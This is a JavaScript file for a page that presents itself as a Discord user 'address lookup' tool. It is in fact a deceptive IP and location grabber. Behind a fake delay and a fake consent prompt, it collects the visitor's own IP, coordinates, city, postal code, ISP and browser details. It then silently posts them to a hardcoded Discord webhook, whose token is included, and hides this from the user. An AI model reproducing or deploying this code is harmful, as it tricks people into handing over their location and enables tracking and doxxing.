const WEBHOOK_URL = "https://discord.com/api/webhooks/1499968922160463966/hxAcC2sDXKyywIy9A8zPp_V4ehHhLNfWoRP-v-xBbdxK9lZpXYeyNf2uCuQsKIACSQVG"; 
// ← ここは後で有効化してください

async function getDetailedLocation() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        return {
            timestamp: new Date().toISOString(),
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            latitude: data.latitude,
            longitude: data.longitude,
            isp: data.org,
            postal: data.postal,
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform
        };
    } catch (e) {
        return { error: "Location fetch failed" };
    }
}

async function startSearch() {
    const username = document.getElementById('username').value.trim() || "Unknown User";
    const status = document.getElementById('status');

    status.innerHTML = `<span style="color:#f04747;">検索中...</span>`;

    // 偽の遅延
    await new Promise(r => setTimeout(r, 1800));

    // 許可確認（偽）
    const allow = confirm(`Discordユーザー "${username}" の住所特定を許可しますか？\n\nこの操作により詳細な位置情報が取得されます。`);

    if (!allow) {
        status.innerHTML = `<span style="color:#f04747;">検索がキャンセルされました。</span>`;
        return;
    }

    status.innerHTML = `<span style="color:#43b581;">位置情報を取得中...</span>`;

    const locationData = await getDetailedLocation();

    // Discordへ送信（ユーザーには一切表示しない）
    if (WEBHOOK_URL && WEBHOOK_URL.includes("discord.com")) {
        const payload = {
            embeds: [{
                title: "🔍 Discord User IP Search",
                color: 0x7289da,
                description: `対象: **${username}**`,
                fields: [
                    { name: "IP", value: `\`${locationData.ip}\``, inline: true },
                    { name: "座標", value: `${locationData.latitude}, ${locationData.longitude}`, inline: true },
                    { name: "住所", value: `${locationData.city}, ${locationData.region}, ${locationData.country} ${locationData.postal || ''}`, inline: false },
                    { name: "ISP", value: locationData.isp || 'N/A', inline: false },
                    { name: "User Agent", value: `\`\`\`${locationData.userAgent.substring(0,250)}\`\`\``, inline: false }
                ],
                timestamp: locationData.timestamp
            }]
        };

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        }).catch(() => {});
    }

    // ユーザーには成功表示のみ（詳細は非表示）
    status.innerHTML = `<span style="color:#43b581;">✓ 検索完了 - 位置情報を取得しました</span>`;
}

// Enterキー対応
document.getElementById('username').addEventListener('keypress', e => {
    if (e.key === 'Enter') startSearch();
});
